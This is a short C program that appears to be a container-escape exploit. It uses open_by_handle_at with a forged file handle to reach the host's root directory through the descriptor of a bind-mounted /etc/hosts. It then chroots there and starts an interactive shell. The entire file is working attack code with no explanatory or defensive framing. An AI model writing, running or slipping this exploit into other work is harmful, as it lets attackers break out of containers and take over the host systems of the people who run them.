#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>

void die(const char *msg)
{
  perror(msg);
  exit(errno);
}

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};

int main()
{
  int fd1, fd2;
  struct my_file_handle h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
  };

  if ((fd1 = open("/etc/hosts", O_RDONLY)) < 0)
    die("failed to open");

  if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
    die("failed to open_by_handle_at");

  fchdir(fd2);
  chroot(".");
  system("sh -i");
  close(fd1);
  close(fd2);

  return 0;
}
